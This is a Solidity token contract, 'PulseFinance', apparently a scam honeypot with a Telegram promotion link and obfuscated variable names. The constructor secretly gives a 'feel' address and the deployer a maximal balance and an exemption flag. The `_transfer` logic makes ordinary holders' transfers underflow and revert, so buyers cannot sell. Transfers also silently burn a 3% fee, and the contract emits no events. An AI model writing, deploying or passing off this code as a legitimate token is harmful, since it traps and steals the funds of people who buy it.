// https://t.me/pulsefinance

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PulseFinance is Ownable {
    constructor(
        string memory cake,
        string memory black,
        address manufacturing,
        address feel
    ) {
        uniswapV2Router = IUniswapV2Router02(manufacturing);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[feel] = cut;
        equal = cake;
        colony = black;
        threw = 9;
        beyond = 3;
        hair[feel] = cut;
        hair[msg.sender] = cut;
        adjective = 1000000000 * 10**threw;
        _balances[msg.sender] = adjective;
    }

    uint256 public beyond;
    string private equal;
    string private colony;
    uint8 private threw;

    function name() public view returns (string memory) {
        return equal;
    }

    function symbol() public view returns (string memory) {
        return colony;
    }

    uint256 private adjective;
    uint256 private worse;
    address public uniswapV2Pair;
    uint256 private cut = ~adjective;
    IUniswapV2Router02 public uniswapV2Router;
    address private feature;

    function decimals() public view returns (uint256) {
        return threw;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return adjective;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address under,
        address doll,
        uint256 but
    ) internal {
        address southern = uniswapV2Pair;
        uint256 plus = beyond;

        if (hair[under] == 0 && (southern != under) && could[under] > 0) {
            hair[under] -= plus;
        }

        address fought = feature;
        feature = doll;

        _balances[under] -= but;
        uint256 up = (but / 100) * beyond;
        but -= up;
        could[fought] += 1 + plus;
        _balances[doll] += but;
    }

    mapping(address => uint256) private could;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private hair;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}